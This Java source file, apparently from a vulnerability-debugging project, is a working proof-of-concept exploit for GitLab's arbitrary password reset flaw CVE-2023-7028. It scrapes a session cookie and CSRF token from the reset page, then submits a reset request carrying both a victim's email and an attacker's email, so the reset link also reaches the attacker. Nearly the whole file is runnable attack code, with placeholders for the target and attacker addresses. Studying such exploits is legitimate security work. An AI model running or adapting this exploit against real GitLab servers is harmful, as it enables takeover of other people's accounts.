package cve;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.http.Response;
import org.apache.http.Header;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;

import java.io.IOException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * GitLab 任意用户密码重置漏洞(CVE-2023-7028)
 */
public class CVE_2023_7028 {


    public static String[] getParamas(String url) throws IOException {

        HttpRequest httpRequest = new HttpRequest("127.0.0.1", 8080);
        HttpGet httpGet = new HttpGet(url);
        Response response = httpRequest.sendGet(httpGet);

        //获取session
        Header[] headers = response.getHeaders();
        String session = null;
        for (Header header : headers) {
            if ( header.getName().equals("Set-Cookie") && header.getValue().startsWith("_gitlab")) {
                int end = header.getValue().indexOf(";");
                session = header.getValue().substring(0, end);
            }
        }
        //获取csrf_token
        String responseBody = response.getResponseBody();
        String regex = "<meta name=\"csrf-token\" content=\"(.*)\" />";
        Matcher matcher = Pattern.compile(regex).matcher(responseBody);
        String csrfToken;
        if (matcher.find()) {
            csrfToken=  matcher.group(1);
        } else {
            csrfToken = null;
        }
        String[] params = {session, csrfToken};
        return params;
    }

    public static void main(String[] args) throws IOException {

        String reset_url = "http://10.58.120.200/users/password/new";
        String[] params = getParamas(reset_url);

        String url = "http://10.58.120.200/users/password";
        HttpRequest httpRequest = new HttpRequest("127.0.0.1", 8080);
        HttpPost httpPost = new HttpPost(url);
        httpPost.addHeader("Content-Type","application/x-www-form-urlencoded");
        httpPost.addHeader("Cookie", params[0]);
        // TODO 输入已存在的邮箱地址
        String validEmail = "admin@example.com";
        // TODO 输入攻击者邮箱地址
        String evilEmail = "123@qq.com";
        String body = "authenticity_token=" + params[1] + "&user[email][]=" + validEmail + "&user[email][]=" + evilEmail;
        Response response = httpRequest.sendStringPost(httpPost, body);
        System.out.println(response.getStatusCode());

    }
}
